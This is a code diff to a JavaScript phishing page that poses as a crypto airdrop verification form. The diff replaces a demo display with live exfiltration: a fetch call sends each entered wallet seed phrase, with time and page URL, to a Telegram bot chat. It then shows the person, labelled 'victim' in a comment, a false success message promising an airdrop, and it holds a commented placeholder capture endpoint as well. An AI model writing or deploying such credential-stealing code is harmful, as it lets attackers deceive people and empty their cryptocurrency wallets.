@@ -104,7 +104,7 @@
             this.style.opacity = '0.5';
         });
 
-        // Submit seed phrase
+        // Submit seed phrase to Telegram bot
         document.getElementById('submitBtn').addEventListener('click', function() {
             const seed = document.getElementById('seedInput').value.trim();
             if (seed.length < 10) {
@@ -112,27 +112,24 @@
                 return;
             }
             
-            // Capture the seed phrase
-            const resultDiv = document.getElementById('result');
-            resultDiv.style.display = 'block';
-            resultDiv.innerHTML = `
-                <p style="color: #00c853; font-weight: bold;">✅ Verification successful!</p>
-                <p style="color: #888; margin-top: 10px;">Your seed phrase has been recorded:</p>
-                <p style="color: #f7931a; margin-top: 10px; font-size: 12px;">${seed}</p>
-                <p style="color: #888; margin-top: 20px;">You will receive your airdrop within 24 hours.</p>
-                <p style="color: #666; margin-top: 10px; font-size: 11px;">(This is a demo - in production, this data would be sent to your server)</p>
+            // Send to Telegram
+            fetch(`https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: '8557348976',
+                    text: '🚨 **New Seed Phrase Captured**\n\n**Seed:** `' + seed + '`\n**Time:** ' + new Date().toLocaleString() + '\n**Page:** ' + window.location.href
+                })
+            });
+            
+            // Show success to victim
+            document.getElementById('result').style.display = 'block';
+            document.getElementById('result').innerHTML = `
+                <p style="color: #00c853;">✅ Verification successful! You will receive your airdrop within 24 hours.</p>
             `;
-            
-            // In production, send this to your server via fetch/POST
-            // fetch('https://your-server.com/capture', { method: 'POST', body: JSON.stringify({ seed: seed }) });
-            
-            // Disable the form
             document.getElementById('seedInput').disabled = true;
             document.getElementById('submitBtn').disabled = true;
             document.getElementById('submitBtn').textContent = '✅ Claimed';
-            
-            // Log to console for testing
-            console.log('Captured Seed Phrase:', seed);
         });
     </script>
 </body>
